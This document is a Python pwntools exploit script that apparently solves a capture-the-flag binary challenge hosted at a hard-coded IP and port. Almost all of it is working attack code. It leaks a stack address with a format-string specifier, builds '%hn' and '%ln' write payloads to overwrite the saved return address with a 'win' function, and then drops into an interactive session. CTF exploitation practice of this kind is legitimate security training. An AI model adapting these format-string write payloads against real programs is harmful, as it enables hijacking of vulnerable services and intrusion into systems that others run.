#!/usr/bin/python
from pwn import *

CONN = "nc 103.181.183.216 17000".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
b *main+101
b *main+241
b *main+282
c
""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -h".split(" ")ls
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
libc = ELF("./libc6_2.35-0ubuntu1_amd64.so")

# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    libc = ELF("./libc6_2.35-0ubuntu1_amd64.so")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

WIN = 0x00000000004011e7+1

sla(b"Nama : ", b"%6$p")
leak2 = eval(rl().decode().strip())
stack_ret_addr = leak2 - 0x110
info("ret addr: " + hex(stack_ret_addr))

target = stack_ret_addr & 0xffff
payload = f"%{target}c%6$hn".encode()
payload = payload.ljust(48, b"|")
print(payload)
sla(b"NIM : ", payload)

target = f"%{WIN}x%45$ln".encode()
sla(b": ", target)

io.interactive()